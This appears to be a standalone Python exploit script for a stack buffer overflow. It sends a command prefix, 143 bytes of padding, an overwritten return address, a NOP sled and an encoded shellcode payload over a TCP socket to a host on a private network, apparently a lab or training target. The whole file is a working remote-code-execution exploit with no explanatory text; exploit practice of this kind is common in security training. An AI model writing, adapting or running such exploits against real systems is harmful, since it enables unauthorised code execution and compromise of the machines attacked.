#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
from struct import *

host="192.168.5.87"
port=7274

offset = "A" * 143
eip = pack('<L', 0x7274146F)

buf =  b""
buf += b"\xbf\x72\x98\xfa\x04\xda\xd3\xd9\x74\x24\xf4\x5a"
buf += b"\x33\xc9\xb1\x52\x31\x7a\x12\x83\xea\xfc\x03\x08"
buf += b"\x96\x18\xf1\x10\x4e\x5e\xfa\xe8\x8f\x3f\x72\x0d"
buf += b"\xbe\x7f\xe0\x46\x91\x4f\x62\x0a\x1e\x3b\x26\xbe"
buf += b"\x95\x49\xef\xb1\x1e\xe7\xc9\xfc\x9f\x54\x29\x9f"
buf += b"\x23\xa7\x7e\x7f\x1d\x68\x73\x7e\x5a\x95\x7e\xd2"
buf += b"\x33\xd1\x2d\xc2\x30\xaf\xed\x69\x0a\x21\x76\x8e"
buf += b"\xdb\x40\x57\x01\x57\x1b\x77\xa0\xb4\x17\x3e\xba"
buf += b"\xd9\x12\x88\x31\x29\xe8\x0b\x93\x63\x11\xa7\xda"
buf += b"\x4b\xe0\xb9\x1b\x6b\x1b\xcc\x55\x8f\xa6\xd7\xa2"
buf += b"\xed\x7c\x5d\x30\x55\xf6\xc5\x9c\x67\xdb\x90\x57"
buf += b"\x6b\x90\xd7\x3f\x68\x27\x3b\x34\x94\xac\xba\x9a"
buf += b"\x1c\xf6\x98\x3e\x44\xac\x81\x67\x20\x03\xbd\x77"
buf += b"\x8b\xfc\x1b\xfc\x26\xe8\x11\x5f\x2f\xdd\x1b\x5f"
buf += b"\xaf\x49\x2b\x2c\x9d\xd6\x87\xba\xad\x9f\x01\x3d"
buf += b"\xd1\xb5\xf6\xd1\x2c\x36\x07\xf8\xea\x62\x57\x92"
buf += b"\xdb\x0a\x3c\x62\xe3\xde\x93\x32\x4b\xb1\x53\xe2"
buf += b"\x2b\x61\x3c\xe8\xa3\x5e\x5c\x13\x6e\xf7\xf7\xee"
buf += b"\xf9\x38\xaf\xf5\xb3\xd0\xb2\xf5\x53\xc0\x3a\x13"
buf += b"\x39\x12\x6b\x8c\xd6\x8b\x36\x46\x46\x53\xed\x23"
buf += b"\x48\xdf\x02\xd4\x07\x28\x6e\xc6\xf0\xd8\x25\xb4"
buf += b"\x57\xe6\x93\xd0\x34\x75\x78\x20\x32\x66\xd7\x77"
buf += b"\x13\x58\x2e\x1d\x89\xc3\x98\x03\x50\x95\xe3\x87"
buf += b"\x8f\x66\xed\x06\x5d\xd2\xc9\x18\x9b\xdb\x55\x4c"
buf += b"\x73\x8a\x03\x3a\x35\x64\xe2\x94\xef\xdb\xac\x70"
buf += b"\x69\x10\x6f\x06\x76\x7d\x19\xe6\xc7\x28\x5c\x19"
buf += b"\xe7\xbc\x68\x62\x15\x5d\x96\xb9\x9d\x6d\xdd\xe3"
buf += b"\xb4\xe5\xb8\x76\x85\x6b\x3b\xad\xca\x95\xb8\x47"
buf += b"\xb3\x61\xa0\x22\xb6\x2e\x66\xdf\xca\x3f\x03\xdf"
buf += b"\x79\x3f\x06"

esp = "\x90" * 16
esp += buf

payload = offset + eip + esp

buffer = "EXPLOIT1 "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host,port))
print("Enviando exploit...")
exp.send(buffer)

exp.close()

